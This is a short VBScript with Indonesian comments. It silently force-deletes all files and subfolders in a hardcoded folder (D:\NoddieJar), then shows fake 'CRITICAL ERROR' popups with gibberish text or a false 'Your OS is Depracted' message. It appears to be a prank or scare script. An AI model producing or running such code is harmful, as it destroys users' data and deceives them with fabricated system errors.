Set fso = CreateObject("Scripting.FileSystemObject")
folderPath = "D:\NoddieJar"

If fso.FolderExists(folderPath) Then
    On Error Resume Next ' Handle error jika ada file yang sedang digunakan
    
    Set folder = fso.GetFolder(folderPath)
    
    ' Hapus semua file
    For Each file In folder.Files
        fso.DeleteFile file.Path, True
    Next
    
    ' Hapus semua subfolder
    For Each subFolder In folder.SubFolders
        fso.DeleteFolder subFolder.Path, True
    Next
    
    ' Popup setelah penghapusan selesai
    If Err.Number = 0 Then
        MsgBox "A0000100 000000400Y0299000100S00S0S00E0E0200D00R0300", vbSystemModal + vbInformation, "CRITICAL ERROR"
    Else
        MsgBox "cosnt 8272729 be927278 9373773(($-8298$+3&$!"883+3;$(*8+2;($83+2;$(+2;2;$82;2$(", vbSystemModal + vbExclamation, "CRITICAL ERROR"
    End If
    
Else
    MsgBox "Your OS is Depracted", vbSystemModal + vbCritical, "Error"
End If